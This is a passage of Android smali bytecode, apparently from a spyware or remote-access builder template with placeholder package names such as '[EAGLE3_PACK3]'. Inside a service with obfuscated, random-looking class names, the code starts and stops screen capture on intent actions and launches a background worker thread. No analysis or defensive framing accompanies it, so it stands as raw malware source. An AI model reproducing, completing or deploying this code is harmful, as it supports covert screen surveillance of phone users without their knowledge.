    invoke-virtual {p0, p1}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_0

    .line 154
    :cond_2
    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p2

    invoke-virtual {v0, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    const/4 v0, 0x1

    if-eqz p2, :cond_4

    .line 155
    iget-object p1, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->resultData:Landroid/content/Intent;

    if-eqz p1, :cond_3

    .line 157
    invoke-virtual {p0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    invoke-direct {p0, p1}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->startCapture(Landroid/content/Context;)V

    .line 158
    sput-boolean v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->ISON:Z

    .line 159
    sput-boolean v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->ctd:Z

    .line 160
    invoke-virtual {p0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->pr()V

    goto :goto_0

    .line 164
    :cond_3
    new-instance p1, Landroid/content/Intent;

    const-class p2, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/RequestScreenCap;

    invoke-direct {p1, p0, p2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 p2, 0x800000

    .line 166
    invoke-virtual {p1, p2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object p1

    .line 167
    invoke-virtual {p1, p3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object p1

    .line 169
    invoke-virtual {p0, p1}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->startActivity(Landroid/content/Intent;)V

    goto :goto_0

    :cond_4
    const-string p2, "[EAGLE_PACKAGE_NAME].SHUTDOWN"

    .line 172
    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p2, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    if-eqz p1, :cond_5

    const/4 p1, 0x0

    .line 176
    :try_start_3
    sput-boolean p1, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->ISON:Z

    .line 177
    invoke-static {}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->stopCapture()V

    .line 178
    invoke-virtual {p0, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->stopForeground(Z)V

    .line 179
    invoke-virtual {p0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;->stopSelf()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    goto :goto_0

    :catch_1
    move-exception p1

    .line 187
    invoke-virtual {p1}, Ljava/lang/Exception;->printStackTrace()V

    :catch_2
    :cond_5
    :goto_0
    const/4 p1, 0x2

    return p1
.end method

.method public pr()V
    .locals 2

    .line 226
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture$1;

    invoke-direct {v1, p0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture$1;-><init>(L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/umcahpnqwnqdjkepksicqyrivivsooegfsfdidyvvmkymgdmro27ture;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 307
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method
